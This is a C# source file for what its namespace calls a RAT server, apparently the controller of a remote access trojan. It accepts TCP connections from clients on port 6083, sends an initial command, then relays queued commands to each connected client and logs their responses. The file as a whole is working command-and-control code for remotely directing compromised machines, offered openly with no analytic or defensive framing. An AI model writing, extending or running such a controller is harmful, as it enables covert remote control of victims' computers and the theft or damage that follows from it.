using System.Net;
using System.Net.Sockets;
using System.Text;
using GeneralPurposeLib;

namespace RATServer; 

public static class RatServerListener {
    
    public static readonly List<string> CommandsToRun = new();
    public static readonly string[] InitCommands = {
        "init"
    };
    
    private static string ReceiveMessage(Stream stream) {
        // Read until we get a newline
        StringBuilder cmdBuilder = new();
        while (true) {
            int b = stream.ReadByte();
            if (b == -1) {
                break;
            }
            if (b == '\n') {
                break;
            }
            cmdBuilder.Append((char)b);
        }
        // unescape the newline
        return cmdBuilder.ToString().Replace("\\n", "\n");
    }
    
    private static void SendMessage(Socket socket, string data) {
        // Escape the newline character
        data = data.Replace("\n", "\\n");
        // Send the data
        socket.Send(Encoding.UTF8.GetBytes(data + "\n"));
    }
    
    public static async Task StartListening() {
        TcpListener server = new(IPAddress.Any, 6083);
        server.Start(8080);

        while (true) {
    
            // Accept a connection
            Socket socket = await server.AcceptSocketAsync();
            Logger.Info("New connection: " + socket.RemoteEndPoint);
    
            Task task = HandleRequest(socket);
        }
    }

    public static async Task HandleRequest(Socket socket) {
        socket.SetSocketOption(SocketOptionLevel.Socket, SocketOptionName.SendTimeout, 2000);

        foreach (string cmd in InitCommands) {
            // Send command to the client.
            Logger.Info("Sending command: " + cmd);
            SendMessage(socket, cmd);

            // Get the response
            NetworkStream stream = new(socket);
            string data = ReceiveMessage(stream);
            if (cmd == "ping" && data != "pong") {
                Logger.Info("Socket disconnected: " + socket.RemoteEndPoint);
                return;
            }
            Logger.Info("Client response to " + cmd + ": " + data);
        }
        
        int currentCommand = CommandsToRun.Count;
        while (true) {
            // Get command or wait for next command.
            string cmd;
            
            startWait:
            if (currentCommand < CommandsToRun.Count) {
                cmd = CommandsToRun[currentCommand];
                currentCommand++;
            } else {
                await Task.Delay(500);
                goto startWait;
            }
            
            // Send command to the client.
            Logger.Info("Sending command: " + cmd);
            SendMessage(socket, cmd);

            // Get the response
            NetworkStream stream = new(socket);
            string data = ReceiveMessage(stream);
            if (cmd == "ping" && data != "pong") {
                Logger.Info("Socket disconnected: " + socket.RemoteEndPoint);
                return;
            }
            Logger.Info("Client response to " + cmd + ": " + data);
        }
    }
    
}